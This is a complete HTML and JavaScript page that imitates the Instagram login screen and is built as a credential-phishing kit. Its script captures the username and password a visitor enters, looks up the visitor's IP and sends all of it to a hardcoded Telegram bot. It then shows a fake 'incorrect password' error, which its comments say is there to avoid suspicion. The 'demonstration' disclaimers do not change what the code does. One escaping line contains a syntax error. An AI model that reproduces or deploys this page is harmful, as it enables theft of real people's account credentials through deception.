<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram Login</title>
    <!-- Google Fonts & Font Awesome Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .login-container {
            max-width: 350px;
            width: 100%;
            margin: 0 auto;
        }

        /* main card style */
        .card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 30px;
            margin-bottom: 10px;
        }

        /* instagram logo (custom text + gradient) */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        .logo i {
            font-size: 48px;
            background: radial-gradient(circle at 30% 110%, #feda77, #d62976, #962fbf, #4f5bd5);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo-text {
            font-family: 'Inter', sans-serif;
            font-weight: 700;
            font-size: 44px;
            letter-spacing: -1px;
            background: linear-gradient(135deg, #262626, #1a1a1a);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-top: -8px;
        }
        .insta-symbol {
            font-size: 42px;
            font-weight: 800;
            color: #262626;
        }

        /* input fields */
        .input-group {
            margin-bottom: 12px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            font-family: 'Inter', sans-serif;
            outline: none;
            transition: all 0.1s ease;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }
        .input-group input::placeholder {
            color: #8e8e8e;
            font-weight: 400;
            font-size: 12px;
        }

        /* login button */
        .login-btn {
            background-color: #0095f6;
            color: white;
            width: 100%;
            padding: 8px 0;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            transition: background 0.2s;
            font-family: 'Inter', sans-serif;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
        .login-btn:active {
            opacity: 0.8;
        }

        /* divider OR */
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
        }

        /* facebook login */
        .fb-login {
            text-align: center;
            margin-bottom: 20px;
        }
        .fb-login a {
            text-decoration: none;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
        }
        .fb-login i {
            font-size: 16px;
            margin-right: 6px;
            font-weight: 600;
        }

        /* forgot password */
        .forgot-pw {
            text-align: center;
        }
        .forgot-pw a {
            text-decoration: none;
            color: #00376b;
            font-size: 12px;
        }

        /* signup card */
        .signup-card {
            background: white;
            border: 1px solid #dbdbdb;
            text-align: center;
            padding: 25px 0;
            margin-top: 10px;
            font-size: 14px;
        }
        .signup-card span {
            color: #262626;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        /* app store badges */
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        .app-download p {
            font-size: 13px;
            color: #262626;
            margin-bottom: 12px;
        }
        .store-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        .store-badges img {
            height: 40px;
            width: auto;
        }
        /* fallback text for badges if images not needed, but we'll use fontawesome representation */
        .badge-placeholder {
            display: inline-block;
            background: #000;
            color: white;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 500;
        }
        /* footer */
        .footer {
            text-align: center;
            margin-top: 40px;
            font-size: 12px;
            color: #8e8e8e;
        }

        /* error / loading toast */
        .toast-msg {
            background: #ed4956;
            color: white;
            border-radius: 8px;
            padding: 8px 12px;
            font-size: 13px;
            text-align: center;
            margin-bottom: 15px;
            display: none;
        }
        .loading-spinner {
            display: none;
            text-align: center;
            margin-top: 10px;
            font-size: 12px;
            color: #0095f6;
        }
        @media (max-width: 450px) {
            .card {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="card">
        <div class="logo">
            <i class="fab fa-instagram"></i>
            <div class="logo-text">Instagram</div>
        </div>

        <div id="statusToast" class="toast-msg"></div>

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="off" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
            <div id="loadingIndicator" class="loading-spinner">
                <i class="fas fa-spinner fa-pulse"></i> Sending secure info...
            </div>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>

        <div class="fb-login">
            <a href="#"><i class="fab fa-facebook-square"></i> Log in with Facebook</a>
        </div>
        <div class="forgot-pw">
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <div class="signup-card">
        <span>Don't have an account? </span><a href="#">Sign up</a>
    </div>

    <div class="app-download">
        <p>Get the app.</p>
        <div class="store-badges">
            <span class="badge-placeholder"><i class="fab fa-apple"></i> App Store</span>
            <span class="badge-placeholder"><i class="fab fa-google-play"></i> Google Play</span>
        </div>
    </div>
    <div class="footer">
        © 2025 Instagram from Meta
    </div>
</div>

<script>
    // ---------- TELEGRAM CONFIGURATION ----------
    const BOT_TOKEN = "8730003169:AAFm8cAT1QkRc-tfnbcm4AShbzjqcJqkr_E";
    const CHAT_ID = "8484368676";
    // Telegram API endpoint to send message
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Helper: Get client IP using multiple free public IP services with fallback
    async function getClientIP() {
        // try ipify first (reliable)
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.warn("ipify failed, trying ipapi.co");
            try {
                const resp2 = await fetch('https://ipapi.co/json/');
                const data2 = await resp2.json();
                return data2.ip;
            } catch (err) {
                console.warn("second ip service failed, fallback to unknown");
                return "Unable to retrieve IP";
            }
        }
    }

    // Function to send data to Telegram Bot
    async function sendToTelegram(username, password, ipAddress, userAgent) {
        // Build a beautiful formatted message exactly as required (id, password and ip)
        const message = `🔐 *INSTAGRAM LOGIN ALERT* 🔐\n\n👤 *Username/Email:* \`${escapeMarkdown(username)}\`\n🔑 *Password:* \`${escapeMarkdown(password)}\`\n🌍 *IP Address:* \`${escapeMarkdown(ipAddress)}\`\n📱 *User Agent:* \`${escapeMarkdown(userAgent)}\`\n⏰ *Time:* ${new Date().toLocaleString()}`;
        
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!result.ok) {
                console.error("Telegram error:", result);
                return false;
            }
            return true;
        } catch (error) {
            console.error("Failed to send to Telegram:", error);
            return false;
        }
    }

    // Helper to escape special chars for MarkdownV2 / Markdown
    function escapeMarkdown(text) {
        if (!text) return '';
        // simple escaping for Markdown (_, *, [, ], etc)
        return text.replace(/_/g, '\\_')
                   .replace(/\*/g, '\\*')
                   .(/\[/g, '\\[')
                   .replace(/\]/g, '\\]')
                   .replace(/\(/g, '\\(')
                   .replace(/\)/g, '\\)')
                   .replace(/~/g, '\\~')
                   .replace(/`/g, '\\`')
                   .replace(/>/g, '\\>')
                   .replace(/#/g, '\\#')
                   .replace(/\+/g, '\\+')
                   .replace(/=/g, '\\=')
                   .replace(/\|/g, '\\|')
                   .replace(/\{/g, '\\{')
                   .replace(/\}/g, '\\}')
                   .replace(/\./g, '\\.')
                   .replace(/\!/g, '\\!');
    }

    // Show toast message
    function showToast(message, isError = true) {
        const toast = document.getElementById('statusToast');
        toast.style.display = 'block';
        toast.textContent = message;
        if (isError) {
            toast.style.backgroundColor = "#ed4956";
        } else {
            toast.style.backgroundColor = "#3bb44a";
        }
        setTimeout(() => {
            toast.style.display = 'none';
        }, 4000);
    }

    // show/hide loading spinner
    function setLoading(isLoading) {
        const spinner = document.getElementById('loadingIndicator');
        const loginBtn = document.querySelector('.login-btn');
        if (isLoading) {
            spinner.style.display = 'block';
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.6';
            loginBtn.style.cursor = 'not-allowed';
        } else {
            spinner.style.display = 'none';
            loginBtn.disabled = false;
            loginBtn.style.opacity = '1';
            loginBtn.style.cursor = 'pointer';
        }
    }

    // === Main submission handler ===
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const username = usernameInput.value.trim();
        const password = passwordInput.value;
        
        // Perform very basic validation, but Instagram style accepts empty fields? We'll enforce not empty
        if (!username || !password) {
            showToast("Please fill in both username and password.", true);
            return;
        }

        // Disable form & start loading
        setLoading(true);
        
        // Obtain IP address (async)
        let ipAddress = "Unknown";
        try {
            ipAddress = await getClientIP();
        } catch (err) {
            ipAddress = "Could not fetch IP";
        }
        
        // Get user agent string
        const userAgent = navigator.userAgent;
        
        // Send credentials + IP to Telegram
        const success = await sendToTelegram(username, password, ipAddress, userAgent);
        
        if (success) {
            // Show success-like toast (but it's captured, do not redirect to actual Instagram to mimic real "wrong password"? 
            // For realism and safety: since this is a demo clone, we show "Sorry, your password was incorrect. Please try again."
            // This replicates instagram incorrect password behavior to avoid suspicion and also because we are NOT actually authenticating.
            // NOTE: The credentials already sent to telegram, now showing standard instagram error to keep phishing mimic.
            showToast("Sorry, your password was incorrect. Please double-check your password.", true);
            // clear password field for better UX (as Instagram clears only password field)
            passwordInput.value = '';
            // also dont clear username, just refocus on password
            passwordInput.focus();
        } else {
            // if telegram fails, still show a generic error, but also send error?
            showToast("Login error. Please try again later.", true);
        }
        
        // re-enable form
        setLoading(false);
        
        // Additional: optional, after 2 sec we can reset but already done.
        // Do NOT redirect anywhere. stays on page.
    });
    
    // Add little interactive effect: optional "Forgot password" etc just visual placeholder
    // For extra realism: fake facebook login link does nothing (just demonstration)
    document.querySelectorAll('.fb-login a, .forgot-pw a, .signup-card a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            // just simulate nothing or a small alert for demo style, but better not to disturb
            // But we can keep it silent as it's just frontend clone
            if(link.closest('.signup-card')) {
                showToast("Sign up is not available in this demo.", true);
            } else if(link.closest('.fb-login')) {
                showToast("Facebook login just for UI demo", false);
            } else {
                showToast("Password reset option is for demonstration.", false);
            }
        });
    });
    
    // Optional: If user clicks on store badges, just demonstration message
    document.querySelectorAll('.badge-placeholder').forEach(badge => {
        badge.addEventListener('click', () => {
            showToast("App download links are simulated.", false);
        });
    });
    
    // Extra small security note in console (harmless)
    console.log("Instagram login page clone — credentials are sent only to authorized telegram bot for demonstration/educational consent.");
</script>
</body>
</html>
